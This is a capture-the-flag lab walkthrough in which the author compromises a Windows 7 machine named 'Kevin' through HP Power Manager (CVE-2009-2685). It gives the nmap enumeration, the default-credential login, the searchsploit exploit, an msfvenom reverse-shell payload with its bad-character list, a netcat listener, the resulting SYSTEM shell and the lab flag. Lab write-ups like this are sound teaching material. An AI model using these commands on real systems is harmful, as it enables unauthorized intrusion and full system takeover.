# Kevin - Windows 7 Exploitation Walkthrough

This is a full exploitation walkthrough for the **Kevin** lab machine running Windows 7 Ultimate. The objective was to gain SYSTEM-level access by exploiting a vulnerable web application and capturing the administrator flag.

---

## Target Information

**IP Address:** 192.168.232.45  
**Operating System:** Windows 7 Ultimate N  
**Hostname:** KEVIN  
**Workgroup:** WORKGROUP  
**Exposed Application:** HP Power Manager (GoAhead WebServer)

---

## Enumeration

Performed an initial Nmap scan:

```bash
nmap -T4 -A 192.168.232.45 -oN nmap
Identified ports:

80 (HTTP - HP Power Manager)

135 (RPC)

139, 445 (SMB)

3389 (RDP)

49152–49159 (MSRPC dynamic ports)

Navigated to: http://192.168.232.45
Observed HP Power Manager login page.

Default credentials used:

Username: admin

Password: admin

Exploitation - HP Power Manager RCE
Searched for known exploits using Searchsploit:

bash
Copy
Edit
searchsploit HP Power Manager
searchsploit -m 10099.py
Confirmed vulnerability: CVE-2009-2685 — Remote Code Execution via formExportData.php.

Reverse Shell Payload
Generated a reverse shell payload using msfvenom:

bash
Copy
Edit
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.158 LPORT=80 \
-b "\x00\x3a\x26\x3f\x25\x23\x20\x0a\x0d\x2f\x2b\x0b\x5c\x3d\x3b\x2d\x2c\x2e\x24\x25\x1a" \
-e x86/alpha_mixed -f c
Inserted the payload into the SHELL variable inside the 10099.py exploit script.

Gaining Shell Access
Started a Netcat listener:

bash
Copy
Edit
rlwrap nc -nlvp 80
Executed the exploit:

bash
Copy
Edit
python2.7 10099.py 192.168.232.45
Received a reverse shell as:

sql
Copy
Edit
NT AUTHORITY\SYSTEM
Captured Flag
Navigated to:

makefile
Copy
Edit
C:\Users\Administrator\Desktop\proof.txt
Flag:

nginx
Copy
Edit
f9267403b0baf51ae5c66c6d55fd72de
Tools Used
nmap

searchsploit

msfvenom

python2.7

netcat (nc)

rlwrap

Summary
Performed reconnaissance to discover running services

Logged into HP Power Manager using default credentials

Exploited RCE vulnerability (CVE-2009-2685)

Gained SYSTEM-level reverse shell

Captured the final flag from Administrator’s desktop

Author
Farhanahmad Quraishi
